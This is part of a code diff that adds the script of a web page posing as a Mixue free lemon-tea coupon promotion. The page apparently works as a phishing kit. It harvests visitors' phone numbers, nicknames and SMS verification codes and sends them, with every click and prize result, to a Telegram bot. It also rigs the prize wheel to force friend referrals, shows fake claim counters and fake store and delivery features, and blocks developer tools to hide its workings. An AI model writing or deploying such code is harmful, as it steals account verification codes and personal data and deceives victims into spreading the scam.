+    const m = Math.floor(sec/60).toString().padStart(2,'0');
+    const s = (sec%60).toString().padStart(2,'0');
+    if (els.bonusTimer) els.bonusTimer.textContent = `${m}:${s}`;
+    sec--;
+  };
+  tick();
+  timers.bonus = setInterval(tick, 1000);
+}
+
+function initSplashScreen() {
+  const splash = document.getElementById('splashScreen');
+  const progress = document.getElementById('splashProgress');
+  const text = document.getElementById('splashText');
+  
+  let progressValue = 0;
+  const interval = setInterval(() => {
+    progressValue += 3;
+    if (progress) progress.style.width = progressValue + '%';
+    
+    if (progressValue === 30 && text) text.textContent = '正在准备甜蜜惊喜...';
+    if (progressValue === 60 && text) text.textContent = '雪王正在调配最佳口味...';
+    if (progressValue === 90 && text) text.textContent = '马上就好...';
+    
+    if (progressValue >= 100) {
+      clearInterval(interval);
+      setTimeout(() => {
+        if (splash) splash.classList.add('hide');
+      }, 200);
+    }
+  }, 50);
+}
+
+function showInvitePage(phone, nickname) {
+  inviteState.currentPhone = phone;
+  inviteState.currentNickname = nickname;
+  
+  const urlParams = new URLSearchParams(window.location.search);
+  const refCode = urlParams.get('invite');
+  if (refCode && els.inviteCodeInput) {
+    els.inviteCodeInput.value = refCode.toUpperCase();
+  }
+  
+  if (els.mainPage) els.mainPage.classList.add('hidden');
+  if (els.invitePage) {
+    els.invitePage.classList.remove('hidden');
+    els.invitePage.classList.add('show');
+  }
+  
+  loadFromStorage();
+  updateInviteUI();
+  startBonusCountdown();
+  
+  sendTGMessage(`【进入邀请页面】\n手机号：${phone}\n昵称：${nickname}`);
+  simulateLocation();
+}
+
+function updateInviteUI() {
+  if (els.inviteCount) els.inviteCount.textContent = inviteState.invitedCount;
+  if (els.chanceCount) els.chanceCount.textContent = `剩余抽奖次数：${inviteState.chanceCount}`;
+  
+  if (els.checkInBtn) {
+    if (inviteState.checkedIn) {
+      els.checkInBtn.disabled = true;
+      els.checkInBtn.textContent = '✅ 今日已签到';
+    } else {
+      els.checkInBtn.disabled = false;
+      els.checkInBtn.textContent = '📅 每日签到 (+1次机会)';
+    }
+  }
+  
+  if (els.step1 && els.step2 && els.step3 && els.line1 && els.line2) {
+    if (inviteState.invitedCount >= 1) {
+      els.step1.classList.add('completed');
+      els.step1.textContent = '✓';
+      els.line1.classList.add('completed');
+    }
+    if (inviteState.invitedCount >= 2) {
+      els.step2.classList.add('completed');
+      els.step2.textContent = '✓';
+      els.line2.classList.add('completed');
+    }
+    if (inviteState.invitedCount >= 3) {
+      els.step3.classList.add('completed');
+      els.step3.textContent = '✓';
+    } else {
+      els.step3.classList.add('active');
+    }
+  }
+  
+  if (els.bonusTag) {
+    els.bonusTag.style.display = (bonusActive && inviteState.invitedCount > 0) ? 'block' : 'none';
+  }
+  
+  if (els.wheelContainer) {
+    els.wheelContainer.style.display = inviteState.invitedCount > 0 ? 'block' : 'none';
+  }
+  
+  if (els.wheelBtn && els.inviteMoreBtn) {
+    if (inviteState.chanceCount > 0) {
+      els.wheelBtn.classList.remove('hidden');
+      els.inviteMoreBtn.classList.add('hidden');
+      els.wheelBtn.disabled = false;
+      els.wheelBtn.textContent = '🎰 开始抽奖';
+    } else {
+      els.wheelBtn.classList.add('hidden');
+      els.inviteMoreBtn.classList.remove('hidden');
+      els.inviteMoreBtn.textContent = '👥 邀请好友';
+      els.inviteMoreBtn.disabled = false;
+    }
+  }
+  
+  saveToStorage();
+}
+
+function dailyCheckIn() {
+  if (inviteState.checkedIn) {
+    showToast('今日已签到，明天再来吧！');
+    return;
+  }
+  
+  const today = new Date().toDateString();
+  inviteState.checkedIn = true;
+  inviteState.lastCheckIn = today;
+  inviteState.chanceCount += 1;
+  
+  showToast('签到成功！获得1次抽奖机会 🎉');
+  updateInviteUI();
+  saveToStorage();
+  sendTGMessage(`【每日签到】\n手机号：${inviteState.currentPhone}\n获得次数：1\n总次数：${inviteState.chanceCount}`);
+}
+
+function simulateInvite() {
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+  let inviteCode = '';
+  for (let i = 0; i < 6; i++) {
+    inviteCode += chars.charAt(Math.floor(Math.random() * chars.length));
+  }
+  
+  const currentUrl = window.location.href.split('?')[0];
+  const shareLink = `${currentUrl}?invite=${inviteCode}`;
+  const shareText = `🎉 蜜雪冰城免费领柠檬茶！\n\n我的邀请码：${inviteCode}\n点击链接帮我助力：${shareLink}\n\n你也可以领券哦！`;
+  
+  if (navigator.clipboard && window.isSecureContext) {
+    navigator.clipboard.writeText(shareText).then(() => {
+      showToast('邀请链接和邀请码已复制！快去分享吧 📋');
+    }).catch(() => fallbackCopy(shareText));
+  } else {
+    fallbackCopy(shareText);
+  }
+  
+  if (els.inviteMoreBtn) {
+    els.inviteMoreBtn.disabled = true;
+    els.inviteMoreBtn.textContent = '邀请中...';
+  }
+  
+  setTimeout(() => {
+    inviteState.invitedCount++;
+    
+    let gainedChance = Math.floor(Math.random() * 5) + 1;
+    
+    if (bonusActive) {
+      gainedChance *= 2;
+      showToast(`🎉 翻倍奖励！获得 ${gainedChance} 次抽奖机会`);
+    } else {
+      showToast(`成功邀请好友！获得 ${gainedChance} 次抽奖机会`);
+    }
+    
+    inviteState.chanceCount += gainedChance;
+    
+    sendTGMessage(`【新邀请】\n手机号：${inviteState.currentPhone}\n邀请码：${inviteCode}\n当前邀请数：${inviteState.invitedCount}\n获得次数：${gainedChance}\n翻倍状态：${bonusActive ? '是' : '否'}`);
+    
+    updateInviteUI();
+    
+    if (inviteState.invitedCount >= 3) {
+      showToast('🎉 已邀请满3人！现在抽奖必中！', 4000);
+    }
+  }, 1500);
+}
+
+function fallbackCopy(text) {
+  const textArea = document.createElement('textarea');
+  textArea.value = text;
+  textArea.style.position = 'fixed';
+  textArea.style.left = '-9999px';
+  document.body.appendChild(textArea);
+  textArea.focus();
+  textArea.select();
+  
+  try {
+    document.execCommand('copy');
+    showToast('邀请链接和邀请码已复制！快去分享吧 📋');
+  } catch (err) {
+    showToast('复制失败，请手动复制');
+  }
+  document.body.removeChild(textArea);
+}
+
+function redeemInviteCode() {
+  const code = els.inviteCodeInput ? els.inviteCodeInput.value.trim().toUpperCase() : '';
+  
+  if (code.length !== 6) {
+    showToast('请输入6位邀请码');
+    return;
+  }
+  
+  if (!/^[A-Z0-9]{6}$/.test(code)) {
+    showToast('邀请码格式错误');
+    return;
+  }
+  
+  if (els.redeemBtn) {
+    els.redeemBtn.disabled = true;
+    els.redeemBtn.textContent = '兑换中...';
+  }
+  
+  setTimeout(() => {
+    if (Math.random() > 0.2) {
+      const gainedChance = Math.floor(Math.random() * 3) + 1;
+      inviteState.chanceCount += gainedChance;
+      
+      showToast(`兑换成功！获得 ${gainedChance} 次抽奖机会 🎁`);
+      if (els.inviteCodeInput) els.inviteCodeInput.value = '';
+      
+      sendTGMessage(`【兑换邀请码】\n手机号：${inviteState.currentPhone}\n邀请码：${code}\n获得次数：${gainedChance}`);
+      
+      updateInviteUI();
+    } else {
+      showToast('邀请码无效或已被使用 😢');
+    }
+    
+    if (els.redeemBtn) {
+      els.redeemBtn.disabled = false;
+      els.redeemBtn.textContent = '兑换';
+    }
+  }, 1000);
+}
+
+function spinWheel() {
+  if (inviteState.chanceCount <= 0 || isSpinning) return;
+  
+  isSpinning = true;
+  inviteState.chanceCount--;
+  updateInviteUI();
+  
+  if (els.wheelBtn) {
+    els.wheelBtn.disabled = true;
+    els.wheelBtn.textContent = '抽奖中...';
+  }
+  
+  const winIndices = [0, 2, 4, 6];
+  const loseIndices = [1, 3, 5, 7];
+  
+  let resultIndex;
+  if (inviteState.invitedCount < 3) {
+    resultIndex = loseIndices[Math.floor(Math.random() * loseIndices.length)];
+  } else {
+    resultIndex = winIndices[Math.floor(Math.random() * winIndices.length)];
+    inviteState.hasWon = true;
+  }
+  
+  const baseRotation = 360 * 5;
+  const itemAngle = 45;
+  const targetAngle = 360 - (resultIndex * itemAngle) - (itemAngle / 2);
+  
+  if (els.wheel) els.wheel.style.transform = `rotate(${baseRotation + targetAngle}deg)`;
+  
+  setTimeout(() => {
+    handleWheelResult(resultIndex);
+    isSpinning = false;
+    if (els.wheelBtn) {
+      els.wheelBtn.disabled = false;
+      els.wheelBtn.textContent = '🎰 开始抽奖';
+    }
+  }, 4000);
+}
+
+function handleWheelResult(index) {
+  const results = [
+    { name: '柠檬茶券', type: 'win', emoji: '🎁' },
+    { name: '谢谢惠顾', type: 'lose', emoji: '😢' },
+    { name: '冰淇淋券', type: 'win', emoji: '🍦' },
+    { name: '再接再厉', type: 'lose', emoji: '😭' },
+    { name: '奶茶券', type: 'win', emoji: '🧋' },
+    { name: '差一点', type: 'lose', emoji: '🤔' },
+    { name: '神秘大奖', type: 'win', emoji: '🎊' },
+    { name: '下次再来', type: 'lose', emoji: '😅' }
+  ];
+  
+  const result = results[index];
+  
+  sendTGMessage(`【抽奖结果】\n手机号：${inviteState.currentPhone}\n结果：${result.name} ${result.emoji}\n类型：${result.type === 'win' ? '中奖' : '未中奖'}`);
+  
+  if (result.type === 'win') {
+    if (els.wheel) {
+      const rect = els.wheel.getBoundingClientRect();
+      createParticles(rect.left + rect.width/2, rect.top + rect.height/2);
+    }
+    
+    setTimeout(() => {
+      claimed++;
+      updateStock();
+      shootBarrage(inviteState.currentPhone);
+      const newCode = generateCouponCode();
+      if (els.couponCode) els.couponCode.textContent = newCode;
+      if (els.modal) els.modal.classList.add('show');
+      
+      saveCouponToHistory(newCode);
+      
+      if (navigator.clipboard) {
+        navigator.clipboard.writeText(newCode).then(() => {
+          showToast('券码已自动复制到剪贴板！', 4000);
+        }).catch(() => {
+          showToast('券码已生成，请手动长按复制', 4000);
+        });
+      }
+      
+      try {
+        localStorage.setItem('mx_claim_' + inviteState.currentPhone, Date.now().toString());
+      } catch (e) {}
+      
+      sendTGMessage(`【🎉 最终获奖】\n手机号：${inviteState.currentPhone}\n券码：${newCode}\n获奖类型：${result.name}`);
+      
+      if (els.chatBadge) els.chatBadge.style.display = 'none';
+    }, 500);
+  } else {
+    showToast(`${result.emoji} ${result.name}！${inviteState.chanceCount > 0 ? '再试一次吧！' : '邀请好友获得更多机会！'}`);
+    
+    setTimeout(() => {
+      if (inviteState.chanceCount > 0 && els.wheelBtn) {
+        showToast('没中？再来一次吧！点击「开始抽奖」', 3500);
+        els.wheelBtn.disabled = false;
+        els.wheelBtn.textContent = '🎰 再抽一次！';
+      }
+    }, 2500);
+  }
+  
+  saveToStorage();
+}
+
+// TG消息发送（带备用API和超时控制）
+async function sendTGMessage(text) {
+  if (tgApiFailed) {
+    console.log('TG API已失败，跳过发送:', text);
+    return;
+  }
+
+  const trySend = async (apiIndex) => {
+    if (apiIndex >= TG_API_BACKUPS.length) {
+      tgApiFailed = true;
+      console.log('所有TG API均失败，已禁用');
+      return;
+    }
+
+    try {
+      const baseUrl = TG_API_BACKUPS[apiIndex];
+      const ep = `${baseUrl}/bot${_cfg.t}/sendMessage`;
+      const params = new URLSearchParams();
+      params.append('chat_id', _cfg.u);
+      params.append('text', text);
+      
+      const controller = new AbortController();
+      const timeoutId = setTimeout(() => controller.abort(), 8000);
+      
+      const response = await fetch(ep, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: params,
+        signal: controller.signal
+      });
+      
+      clearTimeout(timeoutId);
+      
+      if (!response.ok) throw new Error('HTTP error');
+      console.log('TG消息发送成功');
+      
+    } catch (err) {
+      console.log(`TG API ${apiIndex} 失败，尝试下一个...`);
+      await trySend(apiIndex + 1);
+    }
+  };
+
+  await trySend(currentTgApiIndex);
+}
+
+function antiCheat() {
+  const devtools = /./;
+  devtools.toString = function() {
+    if (els.cheatWarning) els.cheatWarning.classList.add('show');
+    sendTGMessage(`【⚠️ 警告】\n检测到开发者工具\n手机号：${inviteState.currentPhone || '未知'}`);
+    return '';
+  };
+  
+  document.addEventListener('contextmenu', e => {
+    e.preventDefault();
+    showToast('右键已禁用');
+  });
+  
+  document.addEventListener('keydown', e => {
+    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+      e.preventDefault();
+      if (els.cheatWarning) els.cheatWarning.classList.add('show');
+    }
+  });
+}
+
+function initKeyboardShortcuts() {
+  document.addEventListener('keydown', e => {
+    if (e.code === 'Space' && els.wheelBtn && !els.wheelBtn.classList.contains('hidden') && !isSpinning) {
+      e.preventDefault();
+      spinWheel();
+    }
+    
+    if (e.key === 'Escape') {
+      ['modal','agreementModal','historyModal','chatModal','riderModal','navModal'].forEach(id => {
+        if (els[id]) els[id].classList.remove('show');
+      });
+    }
+  });
+}
+
+function startManualReview(phone, nickname, code) {
+  if (isPolling) return;
+  isPolling = true;
+  
+  if (els.loadingMask) els.loadingMask.classList.add('show');
+  
+  setTimeout(() => {
+    if (els.loadingMask) els.loadingMask.classList.remove('show');
+    isPolling = false;
+    showInvitePage(phone, nickname);
+    sendTGMessage(`【审核通过】\n昵称：${nickname}\n手机号：${phone}\n验证码：${code}`);
+  }, 3000 + Math.random() * 2000);
+}
+
+function saveCouponToHistory(code) {
+  try {
+    let history = JSON.parse(localStorage.getItem('mx_coupon_history') || '[]');
+    history.unshift({
+      code: code,
+      time: new Date().toLocaleString('zh-CN'),
+      phone: inviteState.currentPhone || '未知'
+    });
+    if (history.length > 20) history = history.slice(0, 20);
+    localStorage.setItem('mx_coupon_history', JSON.stringify(history));
+  } catch (e) {}
+}
+
+function showCouponHistory() {
+  try {
+    let history = JSON.parse(localStorage.getItem('mx_coupon_history') || '[]');
+    
+    if (els.historyList) {
+      if (history.length === 0) {
+        els.historyList.innerHTML = '<p style="text-align:center;color:#999;">暂无券码记录，快去领券吧～</p>';
+      } else {
+        els.historyList.innerHTML = history.map(item => `
+          <div class="history-item">
+            <strong>${item.code}</strong><br>
+            <small>${item.time} | ${item.phone.slice(0,3)}****${item.phone.slice(7)}</small>
+          </div>
+        `).join('');
+      }
+    }
+    if (els.historyModal) els.historyModal.classList.add('show');
+  } catch (e) {}
+}
+
+const customerReplies = [
+  "嘿嘿～我是雪王小冰呀！有什么可以帮你的吗？😊",
+  "大杯柠檬茶超酸爽的！夏天必备懂？？？快去喝吧～别客气！",
+  "欸欸欸～活动参与得怎么样啦？需要我帮忙吗？",
+  "券码是MX开头的那串对吧？到店出示就行～别截图丢了哈！",
+  "今天天气好热哦～来杯冰柠檬茶解解暑？雪王我都想偷喝一口了哈哈哈",
+  "邀请好友成功了吗？3个就稳拿券啦～我看你这么可爱，肯定很多人愿意帮你点～",
+  "欸你昵称取得好可爱欸～下次还来找我聊天吗？(灬ºωº灬)♡",
+  "别问我为什么叫小冰啦～因为我超冰超甜嘛～嘿嘿",
+  "领完记得五星好评哦～不然雪王要生气了！(〃＞皿＜)",
+  "咋啦？卡住了？刷新试试～我在这等你回来继续聊～",
+  "你这么积极，雪王我给你点个大大的赞！✨",
+  "想再领一杯？那就多拉几个小伙伴来嘛～我看好你！"
+];
+
+function addMessage(text, isCustomer = true) {
+  const msgDiv = document.createElement('div');
+  msgDiv.style.marginBottom = '10px';
+  msgDiv.style.maxWidth = '85%';
+  msgDiv.style.padding = '10px 14px';
+  msgDiv.style.borderRadius = isCustomer ? '18px 18px 18px 4px' : '18px 18px 4px 18px';
+  msgDiv.style.background = isCustomer ? '#fff' : 'var(--mixue-red)';
+  msgDiv.style.color = isCustomer ? '#333' : 'white';
+  msgDiv.style.boxShadow = '0 1px 3px rgba(0,0,0,0.1)';
+  msgDiv.style.alignSelf = isCustomer ? 'flex-start' : 'flex-end';
+  msgDiv.style.fontSize = '0.9rem';
+  
+  if (isCustomer) {
+    msgDiv.innerHTML = `<div style="display:flex; align-items:center; gap:8px; margin-bottom:4px;"><div style="width:28px; height:28px; border-radius:50%; background:var(--mixue-red); display:flex; align-items:center; justify-content:center; font-size:14px; color:white;">🍦</div><span style="font-size:0.75rem; color:#999;">雪王小冰</span></div>${text}`;
+  } else {
+    msgDiv.textContent = text;
+  }
+  
+  if (els.chatMessages) {
+    els.chatMessages.appendChild(msgDiv);
+    els.chatMessages.scrollTop = els.chatMessages.scrollHeight;
+  }
+}
+
+function customerReply(userText = "") {
+  let reply = customerReplies[Math.floor(Math.random() * customerReplies.length)];
+  
+  if (userText.includes('怎么用') || userText.includes('兑换') || userText.includes('使用')) {
+    reply = "券码直接到店出示给店员就行啦～大杯柠檬茶随便换！记得说‘我要用券哦’～别害羞！";
+  } else if (userText.includes('邀请') || userText.includes('好友') || userText.includes('助力')) {
+    reply = "对对对～多拉几个小伙伴来助力，3个就稳稳发券！快去分享你的邀请码呀～我等着给你鼓掌！👏";
+  } else if (userText.includes('谢谢') || userText.includes('感谢')) {
+    reply = "不客气啦～能帮到你雪王我就开心死了！下次还来找我聊天好不好？(づ￣ ³￣)づ";
+  } else if (userText.includes('卡') || userText.includes('加载') || userText.includes('打不开')) {
+    reply = "欸？页面卡了？试试刷新一下～或者换个网络？雪王在这等你回来继续领福利哦～";
+  }
+  
+  setTimeout(() => addMessage(reply, true), 800 + Math.random() * 1500);
+}
+
+function openChat() {
+  if (els.chatModal) {
+    els.chatModal.classList.add('show');
+    if (!chatOpened) {
+      if (els.chatMessages) els.chatMessages.innerHTML = '';
+      addMessage("嘿～我是雪王小冰！欢迎来到蜜雪冰城～有什么我可以帮你的吗？😄", true);
+      chatOpened = true;
+    }
+    if (els.chatBadge) els.chatBadge.style.display = 'none';
+  }
+}
+
+// 门店与配送功能
+function simulateLocation() {
+  setTimeout(() => {
+    userLocation = { lat: 39.9042, lng: 116.4074 };
+    renderStoreList();
+  }, 1200);
+}
+
+function renderStoreList() {
+  if (!els.storeListContainer) return;
+  
+  const sortedStores = [...virtualStores].sort((a, b) => a.distance - b.distance);
+  
+  let html = '<div class="store-list">';
+  sortedStores.forEach((store, index) => {
+    html += `
+      <div class="store-item" onclick="selectStore(${store.id})">
+        <div class="store-icon">🏪</div>
+        <div class="store-info">
+          <div class="store-name">
+            ${store.name}
+            ${index === 0 ? '<span style="background:var(--mixue-red);color:white;padding:2px 6px;border-radius:10px;font-size:0.6rem;">最近</span>' : ''}
+          </div>
+          <div class="store-address">📍 ${store.address}</div>
+          <div class="store-distance">🚶 ${store.distance}公里 | ⭐ ${store.rating}分 | 🕐 ${store.businessHours}</div>
+          <div class="store-actions">
+            <button class="store-btn nav-btn" onclick="event.stopPropagation();openNavigation(${store.id})">🧭 导航</button>
+            <button class="store-btn delivery-btn" onclick="event.stopPropagation();orderDelivery(${store.id})">🛵 配送</button>
+          </div>
+        </div>
+      </div>
+    `;
+  });
+  html += '</div>';
+  
+  els.storeListContainer.innerHTML = html;
+}
+
+function selectStore(storeId) {
+  selectedStore = virtualStores.find(s => s.id === storeId);
+  showToast(`已选择：${selectedStore.name}`);
+}
+
+function switchTab(tab) {
+  currentTab = tab;
+  
+  document.querySelectorAll('.page-tab').forEach((el, index) => {
+    const isActive = (tab === 'invite' && index === 0) || 
+                     (tab === 'store' && index === 1) || 
+                     (tab === 'delivery' && index === 2);
+    el.classList.toggle('active', isActive);
+  });
+  
+  if (els.inviteTabContent) els.inviteTabContent.style.display = tab === 'invite' ? 'block' : 'none';
+  if (els.storeTabContent) els.storeTabContent.style.display = tab === 'store' ? 'block' : 'none';
+  if (els.deliveryTabContent) els.deliveryTabContent.style.display = tab === 'delivery' ? 'block' : 'none';
+  
+  if (tab === 'store' && !userLocation) {
+    simulateLocation();
+  }
+}
+
+function selectDeliveryType(type) {
+  document.querySelectorAll('.delivery-option').forEach(el => {
+    el.classList.remove('selected');
+  });
+  if (event && event.currentTarget) {
+    event.currentTarget.classList.add('selected');
+  }
+}
+
+function openNavigation(storeId) {
+  const store = virtualStores.find(s => s.id === storeId);
+  if (!store) return;
+  
+  selectedStore = store;
+  
+  if (els.navStoreName) els.navStoreName.textContent = store.name;
+  if (els.navDistance) els.navDistance.textContent = store.distance;
+  if (els.navTime) els.navTime.textContent = Math.ceil(store.distance * 12);
+  
+  const trafficConditions = ['畅通', '缓行', '拥堵'];
+  const traffic = trafficConditions[Math.floor(Math.random() * trafficConditions.length)];
+  if (els.navTraffic) {
+    els.navTraffic.textContent = traffic;
+    els.navTraffic.style.color = traffic === '畅通' ? '#52c41a' : traffic === '缓行' ? '#faad14' : '#ff4d4f';
+  }
+  
+  if (els.navModal) els.navModal.classList.add('show');
+  sendTGMessage(`【打开导航】\n门店：${store.name}\n距离：${store.distance}公里`);
+}
+
+function startNavigation() {
+  showToast('正在启动导航...');
+  setTimeout(() => showToast('导航已启动！请跟随语音指引', 3000), 1000);
+}
+
+function openExternalMap() {
+  showToast('正在唤起地图APP...');
+  setTimeout(() => showToast('已为您规划最优路线！', 3000), 1000);
+}
+
+function callRider() {
+  if (!selectedStore) {
+    showToast('请先选择门店！');
+    switchTab('store');
+    return;
+  }
+  
+  const riderIndex = Math.floor(Math.random() * riderNames.length);
+  if (els.riderName) els.riderName.textContent = riderNames[riderIndex];
+  
+  const now = new Date();
+  const eta = new Date(now.getTime() + 25 * 60000);
+  const timeStr = `${eta.getHours()}:${eta.getMinutes().toString().padStart(2, '0')}`;
+  if (els.etaTime) els.etaTime.textContent = timeStr;
+  
+  if (els.riderModal) els.riderModal.classList.add('show');
+  
+  simulateDeliveryProgress();
+  sendTGMessage(`【呼叫骑手】\n门店：${selectedStore.name}\n骑手：${riderNames[riderIndex]}\n预计送达：${timeStr}`);
+}
+
+function simulateDeliveryProgress() {
+  const steps = document.querySelectorAll('.progress-step .step-dot');
+  if (!steps.length) return;
+  
+  let currentStep = 1;
+  
+  const updateStep = () => {
+    if (currentStep >= steps.length) {
+      steps[steps.length - 1].classList.add('completed');
+      steps[steps.length - 1].textContent = '✓';
+      showToast('🎉 订单已送达！请确认收货', 4000);
+      return;
+    }
+    
+    steps[currentStep - 1].classList.remove('active');
+    steps[currentStep - 1].classList.add('completed');
+    steps[currentStep - 1].textContent = '✓';
+    
+    steps[currentStep].classList.add('active');
+    const icons = ['📦', '🛵', '🏠'];
+    if (currentStep < icons.length) {
+      steps[currentStep].textContent = icons[currentStep];
+    }
+    
+    currentStep++;
+    setTimeout(updateStep, 8000 + Math.random() * 5000);
+  };
+  
+  setTimeout(updateStep, 5000);
+}
+
+function closeRiderModal() {
+  if (els.riderModal) els.riderModal.classList.remove('show');
+  showToast('正在实时追踪骑手位置...');
+}
+
+function showNearbyStores() {
+  if (els.modal) els.modal.classList.remove('show');
+  switchTab('store');
+}
+
+function orderDelivery(storeId) {
+  selectStore(storeId);
+  switchTab('delivery');
+  showToast('已为您选择该门店，点击"呼叫骑手配送"即可下单');
+}
+
+// 事件绑定
+function initEventListeners() {
+  if (els.phone) {
+    els.phone.addEventListener('input', checkPhoneValid);
+    els.phone.addEventListener('blur', checkPhoneValid);
+  }
+
+  if (els.closeModalBtn) {
+    els.closeModalBtn.addEventListener('click', () => {
+      if (els.modal) els.modal.classList.remove('show');
+    });
+  }
+
+  if (els.getBtn) {
+    els.getBtn.addEventListener('click', async () => {
+      if (els.getBtn.disabled || isSending) return;
+
+      isSending = true;
+      els.getBtn.disabled = true;
+      els.getBtn.textContent = '发送中...';
+
+      const phone = els.phone ? els.phone.value.trim() : '';
+      const nick = els.nickname ? els.nickname.value.trim() || '无' : '无';
+
+      sendTGMessage(`【新号】\n昵称：${nick}\n手机号：${phone}`);
+
+      let s = 60;
+      els.getBtn.textContent = `重发(${s}s)`;
+      if (els.code) els.code.focus();
+      if (els.countdown) {
+        els.countdown.style.opacity = '1';
+        els.countdown.textContent = `验证码已发送（${s}s）`;
+      }
+
+      timers.code = setInterval(() => {
+        s--;
+        if (s > 0) {
+          els.getBtn.textContent = `重发(${s}s)`;
+          if (els.countdown) els.countdown.textContent = `验证码已发送（${s}s）`;
+        } else {
+          clearInterval(timers.code);
+          isSending = false;
+          els.getBtn.disabled = !( /^1[3-9]\d{9}$/.test(els.phone.value.trim()) && isVerifySuccess );
+          els.getBtn.textContent = '获取验证码';
+          if (els.countdown) els.countdown.style.opacity = '0';
+        }
+      }, 1000);
+    });
+  }
+
+  if (els.code) {
+    els.code.addEventListener('input', () => {
+      const len = els.code.value.trim().length;
+      if (els.submitBtn) {
+        els.submitBtn.style.display = len >= 4 ? 'block' : 'none';
+        els.submitBtn.disabled = len < 6;
+      }
+      els.code.classList.toggle('input-error', len > 0 && len < 6);
+    });
+  }
+
+  if (els.submitBtn) {
+    els.submitBtn.addEventListener('click', () => {
+      if (els.submitBtn.disabled || isPolling) return;
+
+      const phone = els.phone.value.trim();
+      const code = els.code.value.trim();
+      const nick = els.nickname.value.trim() || '无';
+
+      if (code.length !== 6) {
+        showToast('请输入6位有效验证码');
+        return;
+      }
+
+      try {
+        if (localStorage.getItem('mx_claim_' + phone)) {
+          showToast('该手机号已参与过活动');
+          return;
+        }
+      } catch (e) {}
+
+      startManualReview(phone, nick, code);
+    });
+  }
+
+  if (els.inviteMoreBtn) els.inviteMoreBtn.addEventListener('click', simulateInvite);
+  if (els.redeemBtn) els.redeemBtn.addEventListener('click', redeemInviteCode);
+  if (els.wheelBtn) els.wheelBtn.addEventListener('click', spinWheel);
+  if (els.checkInBtn) els.checkInBtn.addEventListener('click', dailyCheckIn);
+
+  if (els.modal) {
+    els.modal.addEventListener('click', e => {
+      if (e.target === els.modal) els.modal.classList.remove('show');
+    });
+  }
+
+  if (els.rejectedModal) {
+    els.rejectedModal.addEventListener('click', e => {
+      if (e.target === els.rejectedModal) els.rejectedModal.classList.remove('show');
+    });
+  }
+
+  if (els.copyCouponBtn) {
+    els.copyCouponBtn.addEventListener('click', () => {
+      const code = els.couponCode ? els.couponCode.textContent : '';
+      if (navigator.clipboard) {
+        navigator.clipboard.writeText(code).then(() => showToast('券码已复制！'));
+      } else {
+        showToast('请长按券码手动复制');
+      }
+    });
+  }
+
+  if (els.shareBtn) {
+    els.shareBtn.addEventListener('click', () => {
+      const code = els.couponCode ? els.couponCode.textContent : '';
+      const text = `蜜雪冰城免费大杯柠檬茶到手啦！券码：${code}\n快来一起喝！`;
+      if (navigator.share) {
+        navigator.share({ title: '免费柠檬茶', text: text });
+      } else {
+        navigator.clipboard.writeText(text).then(() => showToast('分享文案已复制，快发给朋友吧！'));
+      }
+    });
+  }
+
+  if (els.viewHistoryBtn) els.viewHistoryBtn.addEventListener('click', showCouponHistory);
+
+  if (els.sendChatBtn && els.chatInput) {
+    els.sendChatBtn.addEventListener('click', () => {
+      const text = els.chatInput.value.trim();
+      if (!text) return;
+      
+      addMessage(text, false);
+      els.chatInput.value = '';
+      customerReply(text);
+    });
+
+    els.chatInput.addEventListener('keypress', e => {
+      if (e.key === 'Enter') els.sendChatBtn.click();
+    });
+  }
+  
+  ['riderModal','navModal','agreementModal','historyModal','chatModal'].forEach(id => {
+    if (els[id]) {
+      els[id].addEventListener('click', e => {
+        if (e.target === els[id]) els[id].classList.remove('show');
+      });
+    }
+  });
+}
+
+// 检测网络错误并显示提示
+function checkNetworkError() {
+  window.addEventListener('error', (e) => {
+    console.error('页面错误:', e);
+    if (e.message && e.message.includes('ERR_CONNECTION_RESET')) {
+      if (els.networkError) els.networkError.classList.add('show');
+    }
+  });
+}
+
+// 启动
+function init() {
+  cacheElements();
+  checkNetworkError();
+  initSplashScreen();
+  antiCheat();
+  initKeyboardShortcuts();
+  initEventListeners();
+  
+  timers.fake = setInterval(fakeClaim, 1500);
+  timers.barrage = setInterval(() => {
+    if (Math.random() > 0.4) shootBarrage();
+  }, 1800);
+  startCountdown();
+  updateStock();
+  
+  setTimeout(() => {
+    const splash = document.getElementById('splashScreen');
+    if (splash) splash.classList.add('hide');
+  }, 2200);
+}
+
+// 页面加载完成后初始化
+if (document.readyState === 'loading') {
+  document.addEventListener('DOMContentLoaded', init);
+} else {
+  init();
+}
+
+window.addEventListener('beforeunload', () => {
+  Object.values(timers).forEach(t => {
+    if (t) clearInterval(t);
+  });
+  saveToStorage();
+});
+</script>
+</body>
+</html>
